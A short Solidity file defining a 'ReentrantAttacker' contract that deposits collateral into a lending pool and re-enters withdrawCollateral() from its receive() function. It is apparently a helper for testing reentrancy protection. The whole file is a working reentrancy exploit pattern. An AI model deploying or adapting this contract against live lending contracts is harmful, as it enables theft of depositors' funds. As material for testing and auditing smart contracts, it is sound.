// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface ILendingPool {
    function depositCollateral() external payable;
    function withdrawCollateral(uint256 amount) external;
}

contract ReentrantAttacker {

    ILendingPool public lendingPool;

    bool public attackActive;

    constructor(address _lendingPool) {
        lendingPool = ILendingPool(_lendingPool);
    }

    function deposit() external payable {
        lendingPool.depositCollateral{value: msg.value}();
    }

    function attack(uint256 amount) external {
        attackActive = true;

        lendingPool.withdrawCollateral(amount);
    }

    receive() external payable {

        if (attackActive) {
            attackActive = false;

            // Attempt to re-enter withdrawCollateral()
            lendingPool.withdrawCollateral(msg.value);
        }
    }
}